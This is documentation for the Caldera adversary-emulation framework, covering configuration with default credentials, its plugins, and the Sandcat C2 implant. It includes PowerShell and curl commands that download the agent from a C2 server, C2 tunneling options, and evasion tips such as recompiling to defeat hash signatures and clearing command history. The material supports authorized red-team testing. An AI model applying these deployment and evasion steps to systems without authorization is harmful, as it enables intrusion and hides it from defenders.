api_key_red: ADMIN123  # API key which grants access to Caldera red
app.contact.dns.domain: mycaldera.caldera  # Domain for the DNS contact server
app.contact.dns.socket: 0.0.0.0:53  # Listen host and port for the DNS contact server
app.contact.gist: API_KEY  # API key for the GIST contact
app.contact.html: /weather  # Endpoint to use for the HTML contact
app.contact.http: http://0.0.0.0:8888  # Server to connect to for the HTTP contact
app.contact.tcp: 0.0.0.0:7010  # Listen host and port for the TCP contact server
app.contact.udp: 0.0.0.0:7011  # Listen host and port for the UDP contact server
app.contact.websocket: 0.0.0.0:7012  # Listen host and port for the Websocket contact server
app.frontend.api_base_url: http://localhost:8888
objects.planners.default: atomic  # Specify which planner should be used by default (works for all objects, just replace `planners` with the appropriate object type name)
crypt_salt: REPLACE_WITH_RANDOM_VALUE  # Salt for file encryption
encryption_key: ADMIN123  # Encryption key for file encryption
exfil_dir: /tmp  # The directory where files exfiltrated through the /file/upload endpoint will be stored
host: 0.0.0.0  # Host the server will listen on 
plugins:  # List of plugins to enable
- access
- atomic
- compass
- debrief
- fieldmanual
- gameboard
- manx
- response
- sandcat
- stockpile
- training
port: 8888  # Port the server will listen on
reports_dir: /tmp  # The directory where reports are saved on server shutdown
auth.login.handler.module: default  # Python import path for auth service login handler ("default" will use the default handler)
requirements:  # Caldera requirements
  go:
    command: go version
    type: installed_program
    version: 1.11
  python:
    attr: version
    module: sys
    type: python_module
    version: 3.8.0
users:  # User list for Caldera blue and Caldera red
  blue:
    blue: admin  # Username and password
  red:
    admin: admin
    red: admin
```

## Custom configuration files

Custom configuration files can be created with a new file in the `conf/` directory. The name of the config file can then be specified with the `-E` flag when starting the server.

Caldera will choose the configuration file to use in the following order:

1. A config specified with the `-E` or `--environment` command-line options.  For instance, if started with `python caldera.py -E foo`, Caldera will load it's configuration from `conf/foo.yml`.
2. `conf/local.yml`: Caldera will prefer the local configuration file if no other options are specified.
3. `conf/default.yml`: If no config is specified with the `-E` option and it cannot find a `conf/local.yml` configuration file, Caldera will use its default configuration options.

## Enabling LDAP login

Caldera can be configured to allow users to log in using LDAP. To do so add an `ldap` section to the config with the following fields:

* **dn**: the base DN under which to search for the user
* **server**: the URL of the LDAP server, optionally including the scheme and port
* **user_attr**: the name of the attribute on the user object to match with the username, e.g. `cn` or `sAMAccountName`. Default: `uid`
* **group_attr**: the name of the attribute on the user object to match with the group, e.g. `MemberOf` or `group`. Default: `objectClass`
* **red_group**: the value of the group_attr that specifies a red team user. Default: `red`

For example: 

```yaml
ldap:
  dn: cn=users,cn=accounts,dc=demo1,dc=freeipa,dc=org
  server: ldap://ipa.demo1.freeipa.org
  user_attr: uid
  group_attr: objectClass
  red_group: organizationalperson
```

This will allow the `employee` user to log in as `uid=employee,cn=users,cn=accounts,dc=demo1,dc=freeipa,dc=org`. This
user has an `objectClass` attribute that contains the value `organizationalperson`, so they will be logged in as a red
team user. In contrast, the `admin` user does not have an `objectClass` of `organizationalperson` so they will be logged
in as a blue team user.

Be sure to change these settings to match your specific LDAP environment.

Note that adding the `ldap` section will disable any accounts listed in the `users` section of the config file;
only LDAP will be used for logging in.

## Setting Custom Login Handlers
By default, users authenticate to Caldera by providing credentials (username and password) in the main login page.
These credentials are verified using Caldera's internal user mapping, or via LDAP if LDAP login is enabled for Caldera.
If users want to use a different login handler, such as one that handles SAML authentication or a login handler provided
by a Caldera plugin, the `auth.login.handler.module` keyword in the Caldera configuration file
must be changed from its value of `default`, which is used to load the default login handler.
The configuration value, if not `default`, must be a Python import path string corresponding to the custom login handler relative to the main Caldera directory (e.g. `auth.login.handler.module: plugins.customplugin.app.my_custom_handler`). 
If the keyword is not provided, the default login handler will be used.

The Python module referenced in the configuration file must implement the following method:
```python
def load_login_handler(services):
    """Return Python object that extends LoginHandlerInterface from app.service.interfaces.i_login_handler"""
    pass
```

When loading custom login handlers, Caldera expects the referenced Python module to return an object that extends
`LoginHandlerInterface` from `app.service.interfaces.i_login_handler`. This interface provides all of the methods
that Caldera's authentication service requires to handle logins. If an invalid login handler is referenced in
the configuration file, then the server will exit with an error.

An example login handler Python module may follow the following structure:
```python
from app.service.interfaces.i_login_handler import LoginHandlerInterface

HANDLER_NAME = 'My Custom Login Handler'

def load_login_handler(services):
    return CustomLoginHandler(services, HANDLER_NAME)

class CustomLoginHandler(LoginHandlerInterface):
    def __init__(self, services, name):
        super().__init__(services, name)

    async def handle_login(self, request, **kwargs):
        # Handle login
        pass

    async def handle_login_redirect(self, request, **kwargs):
        # Handle login redirect
        pass
```



# Plugin library

Here you'll get a run-down of all open-source plugins, all of which can be found in the plugins/ directory as separate 
GIT repositories. 

To enable a plugin, add it to the `default.yml` file in the `conf/` directory. Make sure your server is stopped when editing the `default.yml` file.

Plugins can also be enabled through the GUI. Go to *Advanced -> Configuration* and then click on the 'enable' button for the plugin you would like to enable.

## Sandcat

The Sandcat plugin contains Caldera's default agent, which is written in GoLang for
cross-platform compatibility. 

The agent will periodically beacon to the C2 server to receive instructions, execute instructions
on the target host, and then send results back to the C2 server.
The agent also supports payload downloads, file uploads, and a variety of execution and C2 communication options.
For more details, see the [Sandcat plugin documentation](plugins/sandcat/Sandcat-Details.md)

### Deploy 

To deploy Sandcat, use one of the built-in delivery commands which allows you to run the agent on any operating system. 
Each of these commands downloads the compiled Sandcat executable from Caldera and runs it immediately. Find
the commands on the Sandcat plugin tab.

Once the agent is running, it should show log messages when it beacons into Caldera.

> If you have GoLang installed on the Caldera server, each time you run one of the delivery commands above, 
the agent will re-compile itself dynamically and it will change it's source code so it gets a different file 
hash (MD5) and a random name that blends into the operating system. This will help bypass file-based signature detections.

### Options

When deploying a Sandcat agent, there are optional parameters you can use when you start the executable:

* **Server**: This is the location of Caldera. The agent must have connectivity to this host/port. 
* **Group**: This is the group name that you would like the agent to join when it starts. The group does not have to exist. A default group of my_group will be used if none is passed in.
* **v**: Use `-v` to see verbose output from sandcat.  Otherwise, sandcat will run silently.

### Extensions
In order to keep the agent code lightweight, the default Sandcat agent binary ships with limited basic functionality.
Users can dynamically compile additional features, referred to as "gocat extensions". Each extension adds to the 
existing `gocat` module code to provide functionality such as peer-to-peer proxy implementations, additional
executors, and additional C2 contact protocols. 

To request particular gocat extensions, users can 
include the `gocat-extensions` HTTP header when asking the C2 to compile an agent. The header value
must be a comma-separated list of requested extensions. The server will include the extensions in
the binary if they exist and if their dependencies are met (i.e. if extension A requires a particular
Golang module that is not installed on the server, then extension A will not be included).

Below is an example powershell snippet to request the C2 server to include the `proxy_http` and `shells` 
extensions:
```
$url="http://192.168.137.1:8888/file/download"; # change server IP/port as needed
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows"); # specifying Windows build
$wc.Headers.add("file","sandcat.go"); # requesting sandcat binary
$wc.Headers.add("gocat-extensions","proxy_http,shells"); # requesting the extensions
$output="C:\Users\Public\sandcat.exe"; # specify destination filename
$wc.DownloadFile($url,$output); # download
```

The following features are included in the stock agent:
- `HTTP` C2 contact protocol
- `psh` PowerShell executor (Windows)
- `cmd` cmd.exe executor (Windows)
- `sh` shell executor (Linux/Mac)
- `proc` executor to directly spawn processes from executables without needing to invoke a shell (Windows/Linux/Mac)

Additional functionality can be found in the following gocat extensions:
- `gist` extension provides the Github gist C2 contact protocol.
- `shells` extension provides the `osascript` (Mac Osascript) and `pwsh` (Windows powershell core) executors.
- `shellcode` extension provides the shellcode executors.
- `proxy_http` extension provides the `HTTP` peer-to-peer proxy receiver.
- `proxy_smb_pipe` extension provides the `SmbPipe` peer-to-peer proxy client and receiver for Windows (peer-to-peer
communication via SMB named pipes).
- `donut` extension provides the Donut functionality to execute various assemblies in memory. 
See https://github.com/TheWover/donut for additional information.
- `shared` extension provides the C sharing functionality for Sandcat.

#### Exit Codes

Exit codes returned from Sandcat vary across executors. Typical shell executors will return the exit code provided by the shell. Certain executor extensions will return values hard-coded in Sandcat.

Sandcat includes general exit codes which may be utilized by executors, overriden by executors, or used in error cases. The following values describe general Sandcat exit codes:
- `-1`: Error (e.g., cannot decode command, payload not available)
- `0`: Success

The following values describe exit codes utilized by specific executors:
- `shells`: Returns the exit code provided by the OS/shell.
- `shellcode`: Utilizes the general Sandcat exit codes.
- `native` and `native_aws`:
    - `0`: Success
    - `1`: Process error (e.g., error while executing code)
    - `2`: Input error (e.g., invalid parameters)
- `donut`: Returns the exit code provided by the OS/shell.

#### Customizing Default Options & Execution Without CLI Options

It's possible to customize the default values of these options when pulling Sandcat from the Caldera server.  
This is useful if you want to hide the parameters from the process tree. You can do this by passing the values
in as headers instead of as parameters.

For example, the following will download a linux executable that will use `http://10.0.0.2:8888` as the server address 
instead of `http://localhost:8888`.

```
curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' -H 'server:http://10.0.0.2:8888' http://localhost:8888/file/download > sandcat.sh
```
## Caldera for OT

The Caldera for OT plugins extend Caldera by providing support for common industrial protocols. Each plugin contains a collection of abilities unique to an operational technology (OT) protocol.
To install the plugins and learn more about which protocols are currently supported, visit: [https://github.com/mitre/caldera-ot](https://github.com/mitre/caldera-ot).

## Mock 

The Mock plugin adds a set of simulated agents to Caldera and allows you to run complete operations without hooking any other computers up to your server. 

These agents are created inside the `conf/agents.yml` file. They can be edited and you can create as many as you'd like. A sample agent looks like:
```
- paw: 1234
  username: darthvader
  host: deathstar
  group: simulation
  platform: windows
  location: C:\Users\Public
  enabled: True
  privilege: User
  c2: HTTP
  exe_name: sandcat.exe
  executors:
    - pwsh
    - psh
```

After you load the mock plugin and restart Caldera, all simulated agents will appear as normal agents in the Chain plugin GUI and can be used in any operation.

## Manx

The terminal plugin adds reverse-shell capability to Caldera, along with a TCP-based agent called Manx.

When this plugin is loaded, you'll get access to a new GUI page which allows you to drop reverse-shells on target hosts 
and interact manually with the hosts. 

You can use the terminal emulator on the Terminal GUI page to interact with your sessions. 

## Stockpile

The stockpile plugin adds a few components to Caldera:

* Abilities
* Adversaries
* Planner
* Facts

These components are all loaded through the `plugins/stockpile/data/*` directory.

## Response

The response plugin is an autonomous incident response plugin, which can fight back against adversaries
on a compromised host.

Similar to the stockpile plugin, it contains adversaries, abilities, and facts intended for incident response. These components are all loaded through the `plugins/response/data/*` directory.

## Compass

Create visualizations to explore TTPs. Follow the steps below to create your own visualization:

1. Click 'Generate Layer'
1. Click '+' to open a new tab in the navigator
1. Select 'Open Existing Layer'
1. Select 'Upload from local' and upload the generated layer file

Compass leverages ATT&CK Navigator, for more information see: [https://github.com/mitre-attack/attack-navigator](https://github.com/mitre-attack/attack-navigator)

## Caltack

The caltack plugin adds the public MITRE ATT&CK website to Caldera. This is useful for deployments of Caldera where an operator cannot access the Internet to reference the MITRE ATT&CK matrix.

After loading this plugin and restarting, the ATT&CK website is available from the Caldera home page. Not all parts of the ATT&CK website will be available - but we aim to keep those pertaining to tactics and techniques accessible.

## SSL

The SSL plugin adds HTTPS to Caldera. 
> This plugin only works if Caldera is running on a Linux or MacOS machine. It requires HaProxy (>= 1.8) to be installed prior to using it.

When this plugin has been loaded, Caldera will start the HAProxy service on the machine and serve Caldera on all interfaces on port 8443, in addition to the normal http://[YOUR_IP]:8888 (based on the value of the `host` value in the Caldera settings).

Plugins and agents will not automatically update to the service at https://[YOUR_IP]:8443. All agents will need to be redeployed using the HTTPS address to use the secure protocol. The address will not automatically populate in the agent deployment menu. If a self-signed certificate is used, deploying agents may require additional commands to disable SSL certificate checks (such as using the `--insecure` flag to bypass SSL certificate checks in the initial `curl` request when downloading the new agents).

**Warning:** This plugin uses a default self-signed ssl certificate and key which should be replaced. In order to use this plugin securely, you need to generate your own certificate. The directions below show how to generate a new self-signed certificate. If you are unable to connect to Caldera using the self-signed certificate, verify that your system trusts the certificate.

### Setup Instructions

*Note: OpenSSL must be installed on your system to generate a new self-signed certificate*

1. install haproxy >= 1.8 using `brew install haproxy` (MacOS) or `sudo apt-get install haproxy` (Linux).
2. In the root Caldera directory, navigate to `plugins/ssl`.
3. Place a PEM file containing SSL public and private keys in `conf/certificate.pem`. Follow the instructions below to generate a new self-signed certificate:
   - In a terminal, paste the command `openssl req -x509 -newkey rsa:4096  -out conf/certificate.pem -keyout conf/certificate.pem -nodes` and press enter.
   - This will prompt you for identifying details. Enter your country code when prompted. You may leave the rest blank by pressing enter.
4. Copy the file `haproxy.conf` from the `templates` directory to the `conf` directory.
5. Open the file `conf/haproxy.conf` in a text editor.
6. On the line `bind *:8443 ssl crt plugins/ssl/conf/insecure_certificate.pem`, replace `insecure_certificate.pem` with `certificate.pem`.
7. On the line `server caldera_main 127.0.0.1:8888 cookie caldera_main`, replace `127.0.0.1:8888` with the host and port defined in Caldera's `conf/local.yml` file. This should not be required if Caldera's configuration has not been changed.
8. Save and close the file. Congratulations! You can now use Caldera securely by accessing the UI https://[YOUR_IP]:8443 and redeploying agents using the HTTPS service.


## Atomic

The Atomic plugin imports all Red Canary Atomic tests from their open-source GitHub repository.

## GameBoard

The GameBoard plugin allows you to monitor both red-and-blue team operations. The game tracks points for both sides
and determines which one is "winning". The scoring seeks to quantify the amount of true/false positives/negatives
produced by the blue team. The blue team is rewarded points when they are able to catch the red team's actions, and the
red team is rewarded when the blue team is not able to correctly do so. Additionally, abilities are rewarded different amounts of
points depending on the tactic they fulfill.

To begin a gameboard exercise, first log in as blue user and deploy an agent. The 'Auto-Collect' operation will execute automatically. Alternatively, you can begin a different operation with the blue agent if you desire. Log in as red user and begin another operation. Open up the gameboard plugin from the GUI and select these new respective red and blue operations to monitor points for each operation. 

## Human

The Human plugin allows you to build "Humans" that will perform user actions on a target system as a means to obfuscate 
red actions by Caldera. Each human is built for a specific operating system and leverages the Chrome browser along with other native 
OS applications to perform a variety of tasks.  Additionally, these humans can have various aspects of their behavior "tuned"
to add randomization to the behaviors on the target system.

On the Caldera server, there are additional python packages required in order to use the Human plugin.
These python packages can be installed by navigating to the `plugins/human/` directory and running the command `pip3 install -r requirements.txt`

With the python package installed and the plugin enabled in the configuration file, the Human plugin is ready for use.
When opening the plugin within Caldera, there are a few actions that the human can perform.
Check the box for each action you would like the human to perform. 
Once the actions are selected, then "Generate" the human.

The generated human will show a deployment command for how to run it on a target machine.
Before deploying the human on a target machine, there are 3 requirements:

1. Install python3 on the target machine
2. Install the python package `virtualenv` on the target machine
3. Install Google Chrome on the target machine

Once the requirements above are met, then copy the human deployment command from the Caldera server and run it on the target machine.
The deployment command downloads a tar file from the Caldera server, un-archives it, and starts the human using python.
The human runs in a python virtual environment to ensure there are no package conflicts with pre-existing packages.

## Training

This plugin allows a user to gain a "User Certificate" which proves their ability to use Caldera. This is the first of several certificates planned in the future. The plugin takes you through a capture-the-flag style certification course, covering all parts Caldera.

## Access

This plugin allows you to task any agent with any ability from the database. It also allows you to conduct [Initial Access Attacks](Initial-Access-Attacks.md).

### Metasploit Integration

The Access plugin also allows for the easy creation of abilities for Metasploit exploits.

Prerequisites:

* An agent running on a host that has Metasploit installed and initialized (run it once to set up Metasploit's database)
* The `app.contact.http` option in Caldera's configuration includes `http://`
* A fact source that includes a `app.api_key.red` fact with a value equal to the `api_key_red` option in Caldera's configuration

Within the `build-capabilities` tactic there is an ability called `Load Metasploit Abilities`. Run this ability with an agent and fact source as described above, which will add a new ability for each Metasploit exploit. These abilities can then be found under the `metasploit` tactic. Note that this process may take 15 minutes.

If the exploit has options you want to use, you'll need to customize the ability's `command` field. Start an operation in `manual` mode, and modify the `command` field before adding the potential link to the operation. For example, to set `RHOSTS` for the exploit, modify `command` to include `set RHOSTS <MY_RHOSTS_VALUE>;` between `use <EXPLOIT_NAME>;` and `run`.

Alternatively, you can set options by adding a fact for each option with the `msf.` prefix. For example, to set `RHOST`, add a fact called `msf.RHOST`. Then in the ability's `command` field add `set RHOSTS \#{msf.RHOSTS};` between `use <EXPLOIT_NAME>;` and `run`.

## Builder

The Builder plugin enables Caldera to dynamically compile code segments into payloads that can be executed as abilities by implants. Currently, only C# is supported. 

See [Dynamically-Compiled Payloads](Dynamically-Compiled-Payloads.md) for examples on how to create abilities that leverage these payloads.

## Debrief

The Debrief plugin provides a method for gathering overall campaign information and analytics for a selected set of operations. It provides a centralized view of operation metadata and graphical displays of the operations, the techniques and tactics used, and the facts discovered by the operations. 

The plugin additionally supports the export of campaign information and analytics in PDF format.


Plugins
Caldera is built using a plugin architecture on top of the core system. Plugins are separate git repositories that plug new features into the core system. Each plugin resides in the plugins directory and is loaded into Caldera by adding it to the local.yml file.

Plugins can be added through the UI or in the configuration file (likely conf/local.yml). Changes to the configuration file while the server is shut down. The plugins will be enabled when the server restarts.

Each plugin contains a single hook.py file in its root directory. This file should contain an initialize function, which gets called automatically for each loaded plugin when Caldera boots. The initialize function contains the plugin logic that is getting “plugged into” the core system. This function takes a single parameter:

services: a list of core services that live inside the core system.

A plugin can add nearly any new functionality/features to Caldera by using the two objects above.


Sandcat Plugin Details
The Sandcat plugin provides Caldera with its default agent implant, Sandcat. The agent is written in GoLang for cross-platform compatibility and can currently be compiled to run on Windows, Linux, and MacOS targets.

While the Caldera C2 server requires GoLang to be installed in order to compile agent binaries, no installation is required on target machines - the agent program will simply run as an executable.

The sandcat plugin does come with precompiled binaries, but these only contain the basic agent features and are more likely to be flagged by AV as they are publicly available on GitHub.

If you wish to dynamically compile agents to produce new hashes or include additional agent features, the C2 server must have GoLang installed.

Source Code
The source code for the sandcat agent is located in the gocat and gocat-extensions directories. gocat contains the core agent code, which provides all of the basic features. gocat-extensions contains source code for extensions that can be compiled into new agent binaries on demand. The extensions are kept separate to keep the agent lightweight and to allow more flexibility when catering to various use cases.

Precompiled Binaries
Precompiled agent binaries are located in the payloads directory and are referenced with the following filename:

sandcat.go-darwin compiled binary for Mac targets

sandcat.go-darwin-arm64 compiled binary for Mac with ARM processor targets

sandcat.go-linux compiled binary for Linux targets

sandcat.go-windows compiled binary for Windows targets

These files get updated when dynamically compiling agents, so they will always contain the latest compiled version on your system.

Deploy
To deploy Sandcat, use one of the built-in delivery commands from the main server GUI which allows you to run the agent on Windows, Mac, or Linux.

Each of these commands downloads a compiled Sandcat executable from Caldera and runs it immediately.

Once the agent is running, it should show log messages when it beacons into Caldera.

If you have GoLang installed on the Caldera server, each time you run one of the delivery commands above, the agent will re-compile itself dynamically to obtain a new file hash. This will help bypass file-based signature detections.

Options
When running the Sandcat agent binary, there are optional parameters you can use when you start the executable:

-H "architecture: [architecture]": For MacOS, both amd64 and arm64 are supported. When retrieving the executable from the server, the architecture header can be used to select the correct executable: -H "architecture:amd64" or -H "architecture:arm64".

-server [C2 endpoint]: This is the location (e.g. HTTP URL, IPv4:port string) that the agent will use to reach the C2 server. (e.g. -server http://10.0.0.1:8888, -server 10.0.0.1:53, -server https://example.com). The agent must have connectivity to this endpoint.

-group [group name]: This is the group name that you would like the agent to join when it starts. The group does not have to exist beforehand. A default group of red will be used if this option is not provided (e.g. -group red, -group mygroup)

-v: Toggle verbose output from sandcat. If this flag is not set, sandcat will run silently. This only applies to output that would be displayed on the target machine, for instance if running sandcat from a terminal window. This option does not affect the information that gets sent to the C2 server.

-httpProxyGateway [gateway]: Sets the HTTP proxy gateway if running Sandcat in environments that use proxies to reach the internet

-paw [identifier]: Optionally assign the agent with an identifier value. By default, the agent will be assigned a random identifier by the C2 server.

-c2 [C2 method name]: Instruct the agent to connect to the C2 server using the given C2 communication method. By default, the agent will use HTTP(S). The following C2 channels are currently supported:

HTTP(S) (-c2 HTTP, or simply exclude the c2 option)

DNS Tunneling (-c2 DnsTunneling): requires the agent to be compiled with the DNS tunneling extension.

FTP (-c2 FTP): requires the agent to be compiled with the FTP extension

Github GIST (-c2 GIST): requires the agent to be compiled with the Github Gist extension

Slack (-c2 Slack): requires the agent to be compiled with the Slack extension

SMB Pipes (-c2 SmbPipe): allows the agent to connect to another agent peer via SMB pipes to route traffic through an agent proxy to the C2 server. Cannot be used to connect directly to the C2. Requires the agent to be compiled with the proxy_smb_pipe SMB pipe extension.

-delay [number of seconds]: pause the agent for the specified number of seconds before running

-listenP2P: Toggle peer-to-peer listening mode. When enabled, the agent will listen for and accept peer-to-peer connections from other agents. This feature can be leveraged in environments where users want agents within an internal network to proxy through another agent in order to connect to the C2 server.

-originLinkID [link ID]: associated the agent with the operation instruction with the given link ID. This allows the C2 server to map out lateral movement by determining which operation instructions spawned which agents.

Additionally, the sandcat agent can tunnel its communications to the C2 using the following options (for more details, see the C2 tunneling documentation

Extensions
In order to keep the agent code lightweight, the default Sandcat agent binary ships with limited basic functionality. Users can dynamically compile additional features, referred to as “gocat extensions”. Each extension is temporarily added to the existing core sandcat code to provide functionality such as peer-to-peer proxy implementations, additional executors, and additional C2 communication protocols.

To request particular extensions, users must include the gocat-extensions HTTP header when asking the C2 to compile an agent. The header value must be a comma-separated list of requested extensions. The server will include the extensions in the binary if they exist and if their dependencies are met (i.e. if the extension requires a particular GoLang module that is not installed on the server, then the extension will not be included).

Below is an example PowerShell snippet to request the C2 server to include the proxy_http and shells extensions:

$url="http://192.168.137.1:8888/file/download"; # change server IP/port as needed
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows"); # specifying Windows build
$wc.Headers.add("file","sandcat.go"); # requesting sandcat binary
$wc.Headers.add("gocat-extensions","proxy_http,shells"); # requesting the extensions
$output="C:\Users\Public\sandcat.exe"; # specify destination filename
$wc.DownloadFile($url,$output); # download
The following features are included in the stock default agent:

HTTP C2 contact protocol for HTTP(S)

psh PowerShell executor (Windows)

cmd cmd.exe executor (Windows)

sh shell executor (Linux/Mac)

proc executor to directly spawn processes from executables without needing to invoke a shell (Windows/Linux/Mac)

SSH tunneling to tunnel traffic to the C2 server.

Additional functionality can be found in the following agent extensions:

C2 Communication Extensions

gist: provides the Github Gist C2 contact protocol. Requires the following GoLang modules:

github.com/google/go-github/github

golang.org/x/oauth2

dns_tunneling: provides the DNS tunneling C2 communication protocol. Requires the following GoLang modules:

github.com/miekg/dns

ftp: provides the FTP C2 communication protocol. Requires the following GoLang modules:

github.com/jlaffaye/ftp

slack: provides the Slack C2 communication protocol.

proxy_http: allows the agent to accept peer-to-peer messages via HTTP. Not required if the agent is simply using HTTP to connect to a peer (acts the same as connecting direclty to the C2 server over HTTP).

proxy_smb_pipe: provides the SmbPipe peer-to-peer proxy client and receiver for Windows (peer-to-peer communication via SMB named pipes).

Requires the gopkg.in/natefinch/npipe.v2 GoLang module

Executor Extensions

shells: provides the osascript (Mac Osascript), pwsh (Windows powershell core), and Python (python2 and python3) executors.

shellcode: provides the shellcode executors.

native: provides basic native execution functionality, which leverages GoLang code to perform tasks rather than calling external binaries or commands.

native_aws: provides native execution functionality specific to AWS. Does not require the native extension, but does require the following GoLang modules:

github.com/aws/aws-sdk-go

github.com/aws/aws-sdk-go/aws

donut: provides the Donut functionality to execute certain .NET executables in memory. See https://github.com/TheWover/donut for additional information.

Other Extensions

shared extension provides the C sharing functionality for Sandcat. This can be used to compile Sandcat as a DLL rather than a .exe for Windows targets.

Exit Codes
Exit codes returned from Sandcat vary across executors. Typical shell executors will return the exit code provided by the shell. Certain executor extensions will return values hard-coded in Sandcat.

Sandcat includes general exit codes which may be utilized by executors, overriden by executors, or used in error cases. The following values describe general Sandcat exit codes:

-1: Error (e.g., cannot decode command, payload not available)

0: Success

The following values describe exit codes utilized by specific executors:

shells: Returns the exit code provided by the OS/shell.

shellcode: Utilizes the general Sandcat exit codes.

native and native_aws:

0: Success

1: Process error (e.g., error while executing code)

2: Input error (e.g., invalid parameters)

donut: Returns the exit code provided by the OS/shell.

Customizing Default Options & Execution Without CLI Options
It is possible to customize the default values of these options when pulling Sandcat from the Caldera server.
This is useful if you want to hide the parameters from the process tree or if you cannot specify arguments when executing the agent binary.

You can do this by passing the values in as headers when requesting the agent binary from the C2 server instead of as parameters when executing the binary.

The following parameters can be specified this way:

server

group

listenP2P

For example, the following will download a linux executable that will use http://10.0.0.2:8888 as the server address instead of http://localhost:8888, will set the group name to mygroup instead of the default red, and will enable the P2P listener:

curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' -H 'server:http://10.0.0.2:8888' -H 'group:mygroup' -H 'listenP2P:true' http://localhost:8888/file/download > sandcat
Additionally, if you want the C2 server to compile the agent with a built-in list of known peers (agents that are actively listening for peer-to-peer requests), you can do so with the following header:

includeProxyPeers Example usage:

includeProxyPeers:all - include all peers, regardless of what proxy methods they are listening on

includeProxypeers:SmbPipe - only include peers listening for SMB pipe proxy traffic

includeProxypeers:HTTP - only include peers listening for HTTP proxy traffic.


Agents
Agent Management
To deploy an agent:

Navigate to the Agents module in the side menu under “Campaigns” and click the “Deploy an agent” button

Choose an agent (Sandcat is a good one to start with) and a platform (target operating system)

Make sure the agent options are correct (e.g. ensure app.contact.http matches the expected host and port for the Caldera server)

app.contact.http represents the HTTP endpoint (including the IP/hostname and port) that the C2 server is listening on for agent requests and beacons. Examples: http://localhost:8888, https://10.1.2.3, http://myc2domain.com:8080

agents.implant_name represents the base name of the agent binary. For Windows agents, .exe will be automatically appended to the base name (e.g. splunkd will become splunkd.exe).

agent.extensions takes in a comma-separated list of agent extensions to compile with your agent binary. When selecting the associated deployment command, this will instruct the C2 server to compile the agent binary with the requested extensions, if they exist. If you just want a basic agent without extensions, leave this field blank. See Sandcat extension documentation for more information on Sandcat extensions.

Choose a command to execute on the target machine. If you want your agent to be compiled with the extensions from agent.extensions, you must select the associated deployment command below: Compile red-team agent with a comma-separated list of extensions (requires GoLang).

On the target machine, paste the command into the terminal or PowerShell window and execute it

The new agent should appear in the table in the Agents tab (if the agent does not appear, check the Agent Deployment section of the Troubleshooting page)

To kill an agent, use the “Kill Agent” button under the agent-specific settings. The agent will terminate on its next beacon.

To remove the agent from Caldera (will not kill the agent), click the red X. Running agents remove from Caldera will reappear when they check in.

Agent Settings
Several configuration options are available for agents:

Beacon Timers: Set the minimum and maximum seconds the agent will take to beacon home. These timers are applied to all newly-created agents.

Watchdog Timer: Set the number of seconds to wait, once the server is unreachable, before killing an agent. This timer is applied to all newly-created agents.

Untrusted Timer: Set the number of seconds to wait before marking a missing agent as untrusted. Operations will not generate new links for untrusted agents. This is a global timer and will affect all running and newly-created agents.

Implant Name: The base name of newly-spawned agents. If necessary, an extension will be added when an agent is created (e.g. splunkd will become splunkd.exe when spawning an agent on a Windows machine).

Bootstrap Abilities: A comma-separated list of ability IDs to be run on a new agent beacon. By default, this is set to run a command which clears command history.

Deadman Abilities: A comma-separated list of ability IDs to be run immediately prior to agent termination. The agent must support deadman abilities in order for them to run.

Agents have a number of agent-specific settings that can be modified by clicking on the button under the ‘PID’ column for the agent:

Group: Agent group

Sleep: Beacon minimum and maximum sleep timers for this specific agent, separated by a forward slash (/)

Watchdog: The watchdog timer setting for this specific agent

Abilities
The majority of abilities are stored inside the Stockpile plugin (plugins/stockpile/data/abilities), along the adversary profiles which use them. Abilities created through the UI will be placed in data/abilities.

Here is a sample ability:

- id: 9a30740d-3aa8-4c23-8efa-d51215e8a5b9
  name: Scan WIFI networks
  description: View all potential WIFI networks on host
  tactic: discovery
  technique:
    attack_id: T1016
    name: System Network Configuration Discovery
  platforms:
    darwin:
      sh:
        command: |
          ./wifi.sh scan
        payload: wifi.sh
    linux:
      sh:
        command: |
          ./wifi.sh scan
        payload: wifi.sh
    windows:
      psh:
        command: |
          .\wifi.ps1 -Scan
        payload: wifi.ps1
Things to note:

Each ability has a random UUID id

Each ability requires a name, description, ATT&CK tactic and technique information

Each ability requires a platforms list, which should contain at least 1 block for a supported operating system (platform). Currently, abilities can be created for Windows, Linux, and Darwin (MacOS).

Abilities can be added to an adversary through the GUI with the ‘add ability’ button

The delete_payload field (optional, placed at the top level, expects True or False) specifies whether the agent should remove the payload from the filesystem after the ability completes. The default value, if not provided, is True.

The singleton field (optional, placed at the top level, expects True or False) specifies that the ability should only be run successfully once - after it succeeds, it should not be run again in the same operation. The default value, if not provided, is False.

The repeatable field (optional, placed at the top level, expects True or False) specifies that the ability can be repeated as many times as the planner desires. The default value, if not provided, is False.

Please note that only one of singleton or repeatable should be True at any one time - singleton operates at an operational level, and repeatable at an agent level. If both are true at the same time, Caldera may behave unexpected.

For each platform, there should be a list of executors. In the default Sandcat deployment, Darwin and Linux platforms can use sh and Windows can use psh (PowerShell) or cmd (command prompt).

Each platform block consists of a:

command (required)

payload (optional)

uploads (optional)

cleanup (optional)

parsers (optional)

requirements (optional)

timeout (optional)

Command: A command can be 1-line or many and should contain the code you would like the ability to execute. Newlines in the command will be deleted before execution. The command can (optionally) contain variables, which are identified as #{variable}.

Prior to execution of a command, Caldera will search for variables within the command and attempt to replace them with values. The values used for substitution depend on the type of the variable in the command: user-defined or global variable. User-defined variables are associated with facts can be filled in with fact values from fact sources or parser output, while global variables are filled in by Caldera internally and cannot be substituted with fact values.

The following global variables are defined within Caldera:

#{server} references the FQDN of the Caldera server itself. Because every agent may know the location of Caldera differently, using the #{server} variable allows you to let the system determine the correct location of the server.

#{group} is the group a particular agent is a part of. This variable is mainly useful for lateral movement, where your command can start an agent within the context of the agent starting it.

#{paw} is the unique identifier - or paw print - of the agent.

#{location} is the location of the agent on the client file system.

#{exe_name} is the executable name of the agent.

#{upstream_dest} is the address of the immediate “next hop” that the agent uses to reach the Caldera server. For agents that directly connect to the server, this will be the same as the #{server} value. For agents that use peer-to-peer, this value will be the peer address used.

#{origin_link_id} is the internal link ID associated with running this command used for agent tracking.

#{payload} and #{payload:<uuid>} are used primarily in cleanup commands to denote a payload file downloaded by an agent.

#{app.*} are configuration items found in your main Caldera configuration (e.g., conf/default.yml) with a prefix of app.. Variables starting with app. that are not found in the Caldera configuration are not treated as global variables and can be subject to fact substitution.

